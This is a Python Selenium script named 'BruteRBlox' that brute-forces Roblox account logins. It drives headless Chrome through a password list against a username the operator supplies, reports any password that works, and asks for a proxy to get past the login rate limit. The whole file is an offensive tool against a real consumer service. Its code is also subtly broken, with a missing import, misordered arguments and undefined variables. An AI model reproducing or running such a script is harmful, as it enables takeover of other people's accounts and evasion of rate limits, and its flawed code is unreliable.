from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

print("BruteRBlox (ver 0.0.2b)")
print(" ")
print("Please, make sure that you provide the correct username.")
print(" ")
# v0.0.2
# by RobPyDev

def main():
    print("Executing Chrome...")
    time.sleep(1)
    # Set up Headless Chrome
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--enable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)

    print("Going to login...")
    time.sleep(1)
    # Get the Roblox login page
    driver.get("https://www.roblox.com/login")

    print("YOU CAN PROVIDE USERNAME NOW")
    # Get the user-specified username
    username = input("Username: ")

    print("Getting password_list...")
    time.sleep(1)
    # Read the passwords from the password_list.txt file
    with open("/password_list.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    print("Locating username and pass textboxes...")
    # Find the username and password textboxes and login button
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')
    login_button = driver.find_element(By.ID, 'login-button')

    print("Sending username...")
    # Enter the username
    username_input.send_keys(username)

    # Initialize the login attempt counter
    login_attempts = 0
   
    print("Starting trying each pass...")
    # Try each password
    for password in passwords:
        # Enter the password
        password_input.send_keys(password)
        print(f"> Trying: {password}")


        time.sleep(0.1)

        login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'login-button')))

        # Click the login button
        login_button.click()

        # Wait for the response
        time.sleep(10)

        # Check if the response is the homepage
        if driver.current_url == "https://www.roblox.com/home":
            print(f">> Yay! You successfully logged in as {username} with password {password}.")
            sys.exit(5)
        else:
            print(f">!> Oops! The response was not the homepage. Trying the next password...")

            # Clear the password input
            while password_input.get_attribute('value') != "":
                password_input.clear()
                time.sleep(0.1)

        login_attempts += 1

        if login_attempts > 5 and login_attempts < 8:
            print(">!> Max login attempts!")
            print(">?> You can add a proxy to continue!")
            ip = input("IP: ")
            port = input("Port: ")
            set_proxy(ip,  port, driver)
            break


def set_proxy(driver, ip, port):
    # Set the proxy for the Chrome driver
    print("Setting proxy...")
    chrome_options = Options()
    chrome_options.add_argument("--proxy-server=http=" + ip + ":" + port)
    driver.quit()
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://www.roblox.com/login")
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')
    username_input.send_keys(username)
    password_input.send_keys(password)

if __name__ == "__main__":
    main()

